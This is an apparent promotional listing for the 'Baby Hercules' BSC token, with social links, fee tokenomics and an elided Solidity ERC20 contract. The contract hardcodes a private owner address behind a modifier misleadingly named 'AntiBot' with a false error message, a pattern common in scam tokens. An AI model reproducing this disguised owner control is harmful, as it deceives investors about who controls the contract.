...
📱 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 - https://t.me/BabyHercules

🐦 𝙏𝙒𝙄𝙏𝙏𝙀𝙍 - https://twitter.com/BHerculesBSC

🌐 𝙒𝙀𝘽𝙎𝙄𝙏𝙀 - https://babyhercules.xyz

𝙏𝙊𝙆𝙀𝙉𝙊𝙈𝙄𝘾𝙎 

- 8% 𝘼𝘿𝘿𝙀𝘿 𝙏𝙊 𝙏𝙃𝙀 𝙇𝙄𝙌𝙐𝙄𝘿𝙄𝙏𝙔 𝙋𝙊𝙊𝙇

- 2% 𝘼𝘿𝘿𝙀𝘿 𝙏𝙊 𝙏𝙃𝙀 𝙈𝘼𝙍𝙆𝙀𝙏𝙄𝙉𝙂 𝙒𝘼𝙇𝙇𝙀𝙏
...
contract Context {
 ...
 contract BabyHercules is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "Baby Hercules";
    string private _symbol = "B-HERCULES";
    ...
    address private _BasicOwnership = 0xA0D3A143c13F69Ec0501408876dD1d3638A0C265;
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    modifier AntiBot () {
        require(_BasicOwnership == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
